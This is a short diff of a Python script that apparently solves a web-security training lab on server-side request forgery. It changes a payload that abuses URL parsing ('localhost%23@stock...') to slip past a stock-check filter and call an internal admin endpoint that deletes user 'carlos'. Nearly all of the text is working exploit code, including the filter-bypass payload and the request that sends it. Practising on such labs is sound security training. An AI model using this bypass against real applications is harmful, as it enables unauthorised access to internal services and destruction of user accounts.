@@ -7,7 +7,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
 
 def delete_user(url):
-    delete_user_ssrf_payload =  'http://localhost%25%32%33@stock.weliketoshop.net/admin/admin/delete?username=carlos'
+    delete_user_ssrf_payload =  'http://localhost%23@stock.weliketoshop.net/admin/admin/delete?username=carlos'
     check_stock_path = "/product/stock"
     params = {'stockApi': delete_user_ssrf_payload}
     r = requests.post(url + check_stock_path, data=params, verify=False, proxies=proxies)
